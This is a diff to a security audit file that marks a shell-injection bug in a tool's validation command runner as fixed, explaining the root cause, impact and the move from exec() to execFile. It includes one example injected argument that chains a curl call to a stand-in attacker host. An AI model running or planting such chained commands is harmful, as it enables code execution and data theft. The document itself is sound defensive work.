@@ -10,18 +10,24 @@ Status key: 🔴 open · ✅ fixed
 
 ## Critical
 
-### 1. Shell injection in validation commands — `validation.ts:27` 🔴
-`exec(command, { cwd }, ...)` runs the command string through a shell.
-Any shell metacharacter (`;`, `&&`, `|`, backticks, `$()`) lets a validation
+### 1. Shell injection in validation commands — `validation.ts:27` ✅ FIXED
+`exec(command, { cwd }, ...)` ran the command string through a shell.
+Any shell metacharacter (`;`, `&&`, `|`, backticks, `$()`) let a validation
 command chain in arbitrary additional commands.
 
-- **Root cause**: uses `exec()` (shell-interpreted) instead of
+- **Root cause**: used `exec()` (shell-interpreted) instead of
   `execFile`/`spawn` with an argv array (never shell-interpreted).
-- **Example**: `--validate "npm test; curl attacker.com/steal"` runs both.
-- **Why tests miss it**: the test suite only ever passes safe, literal
+- **Example**: `--validate "npm test; curl attacker.com/steal"` ran both.
+- **Why tests missed it**: the test suite only ever passed safe, literal
   commands like `npm test`.
 - **Impact**: arbitrary code execution for anyone who can influence the
   `--validate` argument (including AI agents calling this via MCP).
+- **Fix applied**: switched to `execFile(program, args, ...)` with a small
+  quote-aware tokenizer that splits the command string into a program and
+  argv array. Shell operators now pass through as literal argument text —
+  they're never interpreted. Trade-off: shell chaining (`&&`, `;`, pipes)
+  in a single `--validate` string no longer works by design; use repeatable
+  `--validate` flags to run multiple commands instead.
 
 ### 2. Validation failure crashes report generation — `validation.ts:26-35` ✅ FIXED
 A failing command (non-zero exit, "command not found", etc.) called
